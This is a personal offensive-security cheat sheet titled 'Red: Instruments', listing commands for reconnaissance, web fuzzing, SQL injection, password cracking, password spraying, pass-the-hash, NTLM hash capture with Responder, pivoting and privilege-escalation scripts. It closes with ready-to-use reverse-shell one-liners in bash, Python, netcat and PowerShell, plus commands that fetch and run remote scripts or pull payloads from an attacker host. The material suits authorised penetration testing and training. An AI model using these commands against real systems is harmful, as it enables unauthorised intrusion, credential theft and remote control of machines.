---
type: section
room: red
tags: [red/instruments]
---

# Red: Instruments

> [!quote]
> *"When you have a tool for every problem, it is only a matter of choosing the right one."*

The working kit for offensive operations. Every tool documented here follows the pattern: **what it does → key flags → most-used commands → OPSEC notes**.

---

## Inventory by Phase

| Phase | Tools |
|-------|-------|
| Reconnaissance | nmap, masscan, amass, subfinder, theHarvester, shodan, whatweb, dnsx, wafw00f, nuclei |
| Web Exploitation | gobuster, ffuf, burpsuite, sqlmap, feroxbuster, wfuzz, nikto |
| Exploitation | metasploit, searchsploit, pwntools |
| Credential Access | hydra, hashcat, john, netexec, mimikatz, secretsdump, responder |
| Privilege Escalation | linpeas, winpeas, pspy, powerup, les, wesng, bloodhound |
| Post-Exploitation | netcat, socat, chisel, ligolo-ng, evil-winrm, impacket |

---

## 🔍 nmap

**Purpose:** Port scanning, service detection, OS fingerprinting, script scanning.

```bash
# Quick scan — top 1000 ports
nmap <target>

# Full port scan (all 65535) — fast
nmap -sS -p- --min-rate 5000 -oA recon/nmap-all <target>

# Service + script scan on specific ports
nmap -sC -sV -p 22,80,443,8080 -oA recon/nmap-detail <target>

# OS detection
nmap -O <target>

# UDP top 100 ports
nmap -sU --top-ports 100 <target>

# Aggressive (all checks, very noisy)
nmap -A <target>

# Scan a full subnet
nmap -sn 10.10.10.0/24 -oG - | grep Up | awk '{print $2}'

# Script categories
nmap --script vuln <target>            # vulnerability scripts
nmap --script smb-enum-shares <target> # SMB shares
nmap --script http-enum <target>       # web directory enum
nmap --script ftp-anon <target>        # anonymous FTP check

# Output formats
nmap ... -oA output    # all formats (nmap, gnmap, xml)
nmap ... -oX out.xml   # XML (parseable)
nmap ... -oG out.gnmap # greppable
```

**Key Flags:**

| Flag | Meaning |
|------|---------|
| `-sS` | SYN scan (stealth, needs root) |
| `-sT` | TCP connect (no root needed) |
| `-sU` | UDP scan |
| `-sV` | Version detection |
| `-sC` | Default scripts |
| `-A` | Aggressive (OS + version + scripts + traceroute) |
| `-p-` | All 65535 ports |
| `-p <list>` | Specific ports e.g. `-p 22,80,443` |
| `--min-rate` | Min packets/sec |
| `-oA <name>` | Output all formats |
| `-Pn` | Skip host discovery (skip ping) |
| `-n` | No DNS resolution |
| `--open` | Show only open ports |

---

## 🌐 gobuster

**Purpose:** Directory/file brute-forcing and DNS subdomain enumeration.

```bash
# Directory brute-force
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster-dir.txt

# With file extensions
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -o gobuster-ext.txt

# Subdomain enumeration
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o gobuster-dns.txt

# VHOST enumeration
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Useful flags
gobuster dir -u <url> -w <wordlist> -t 50 -r -k --no-error -q
# -t threads  -r follow redirects  -k skip TLS verify  -q quiet
```

---

## ⚡ ffuf

**Purpose:** Fast web fuzzer — directories, parameters, subdomains, anything.

```bash
# Directory discovery
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# With extensions
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.html,.txt,.bak

# Parameter fuzzing (GET)
ffuf -u "http://<target>/page.php?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# POST body fuzzing
ffuf -u http://<target>/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 401

# Subdomain fuzzing
ffuf -u http://FUZZ.<domain>/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 301 -fs 0

# Filter by size / status / words
# -mc 200,301  -fc 404  -fs 1234  -fw 10

# Output to file
ffuf ... -o results.json -of json
```

---

## 🕷️ Burp Suite

**Purpose:** Web application proxy — intercept, modify, replay, scan.

```
# Most important shortcuts
Ctrl+I       → Send to Intruder
Ctrl+R       → Send to Repeater
Ctrl+Shift+U → URL-decode selection
Ctrl+Shift+B → Base64-encode selection

# Quick workflow:
1. Set browser proxy → 127.0.0.1:8080
2. Intercept ON → browse target → Intercept OFF
3. Proxy > HTTP history → right-click → Send to Repeater
4. Modify request in Repeater → Ctrl+Space to send
```

**Intruder Attack Types:**
| Type | Use Case |
|------|---------|
| Sniper | One payload list, one position |
| Battering Ram | Same payload in all positions |
| Pitchfork | Parallel lists, one per position |
| Cluster Bomb | All combinations of lists |

```
# Common Intruder payloads:
Wordlists → /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
Numbers   → 1 to 9999 (IDOR testing)
```

---

## 💉 sqlmap

**Purpose:** Automated SQL injection detection and exploitation.

```bash
# Basic GET injection test
sqlmap -u "http://<target>/page.php?id=1" --batch

# POST injection test
sqlmap -u "http://<target>/login" --data="user=admin&pass=test" --batch

# With session cookie (authenticated)
sqlmap -u "http://<target>/page.php?id=1" --cookie="PHPSESSID=xxx" --batch

# Enumerate databases
sqlmap -u "http://<target>/page.php?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "..." -D <database> --tables --batch

# Dump a specific table
sqlmap -u "..." -D <database> -T <table> --dump --batch

# Try to get OS shell (if DBА privileges)
sqlmap -u "..." --os-shell --batch

# Increase detection level (noisier)
sqlmap -u "..." --level=5 --risk=3 --batch

# Using a saved request from Burp
sqlmap -r request.txt --batch
```

---

## 🔑 hashcat

**Purpose:** GPU-accelerated password cracking.

```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv2 (Responder captures)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (TGS-REP)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# ASREPRoast (AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Rules (add complexity)
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (pattern-based)
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d?d?d  # Capital + 3 lower + 4 digits

# Show cracked
hashcat -m 0 hashes.txt --show

# Identify hash type
hashcat --identify hashes.txt
```

**Hash Mode Reference:**
| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | SHA-512 Unix ($6$) |
| 3200 | bcrypt |
| 5600 | NTLMv2 |
| 13100 | Kerberos TGS |
| 18200 | Kerberos AS-REP |

---

## 🏹 netexec (nxc) / crackmapexec

**Purpose:** Multi-protocol network assessment — SMB, WinRM, SSH, RDP, LDAP.

```bash
# SMB — basic auth check
nxc smb <target_range> -u <user> -p <pass>

# SMB — password spray (careful of lockout!)
nxc smb <target> -u users.txt -p 'Password123!' --continue-on-success

# SMB — pass-the-hash
nxc smb <target> -u Administrator -H <ntlm_hash>

# SMB — enumerate shares
nxc smb <target> -u <user> -p <pass> --shares

# SMB — dump SAM
nxc smb <target> -u <user> -p <pass> --sam

# SMB — run command
nxc smb <target> -u <user> -p <pass> -x "whoami"

# WinRM — interactive shell
nxc winrm <target> -u <user> -p <pass>

# LDAP — user enumeration
nxc ldap <target> -u <user> -p <pass> --users

# LDAP — password policy (before spraying!)
nxc smb <target> -u <user> -p <pass> --pass-pol

# Generate relay target list
nxc smb <target_range> --gen-relay-list relay.txt
```

---

## 🩸 Responder

**Purpose:** LLMNR/NBT-NS/mDNS poisoner — captures NTLMv2 hashes passively.

```bash
# Start poisoning on interface
responder -I eth0

# Aggressive mode (respond to everything)
responder -I eth0 -rdw

# Analyse mode only (listen, don't poison — for detection)
responder -I eth0 -A

# Captured hashes saved to:
cat /usr/share/responder/logs/*.txt

# Crack with hashcat
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
```

---

## 🩸 linpeas / winpeas

**Purpose:** Automated privilege escalation enumeration.

```bash
# Linux — download and run
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# OR: wget -qO linpeas.sh <url> && chmod +x linpeas.sh && ./linpeas.sh

# Pipe to file for later review
./linpeas.sh 2>/dev/null | tee linpeas.out

# Linux exploit suggester
./linux-exploit-suggester.sh

# Windows — drop and run (PowerShell)
.\winpeas.exe > winpeas.txt
.\winpeas.exe quiet cmd fast > winpeas-fast.txt

# Windows — PowerUp
. .\PowerUp.ps1; Invoke-AllChecks | Out-File powerup.txt
```

---

## 🔗 chisel (Tunnelling)

**Purpose:** Fast TCP tunnel over HTTP/S — pivoting through firewalls.

```bash
# Server (attacker)
chisel server --port 8000 --reverse

# Client (target) — reverse SOCKS proxy
./chisel client <attacker_ip>:8000 R:socks

# Client — forward specific port
./chisel client <attacker_ip>:8000 R:3306:127.0.0.1:3306

# Configure proxychains to use SOCKS5 127.0.0.1:1080
# Then:
proxychains nmap -sT <internal_ip>
proxychains evil-winrm -i <internal_ip> -u <user> -p <pass>
proxychains firefox   # browse internal web services
```

---

## 🐚 Reverse Shell Quick-Reference

```bash
# Bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e)
nc <ip> <port> -e /bin/bash

# Netcat (FIFO, no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f

# PowerShell one-liner
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ip>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length)};$c.Close()"

# Shell upgrade (after catching raw shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm

# File transfer to target
python3 -m http.server 8080   # on attacker
wget http://<attacker>:8080/<file> -O /tmp/<file>
curl -o /tmp/<file> http://<attacker>:8080/<file>
# Windows:
certutil -urlcache -f http://<attacker>:8080/<file> C:\Temp\<file>
```

↩ [[Red]] · [[Mind Palace]]
